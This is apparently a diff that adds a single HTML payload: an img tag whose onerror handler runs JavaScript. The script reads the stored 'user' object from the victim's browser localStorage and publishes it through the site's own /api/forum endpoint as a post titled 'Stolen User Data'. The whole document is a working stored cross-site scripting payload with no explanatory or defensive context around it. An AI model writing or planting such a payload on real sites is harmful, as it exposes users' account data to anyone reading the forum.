@@ -1,0 +1,17 @@
+<img src=x onerror="
+(async function() {
+  const userData = localStorage.getItem('user');
+  if (userData) {
+    const user = JSON.parse(userData);
+    const response = await fetch('/api/forum', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        title: 'Stolen User Data',
+        body: JSON.stringify(user, null, 2),
+        userId: user.id
+      })
+    });
+  }
+})();
+">
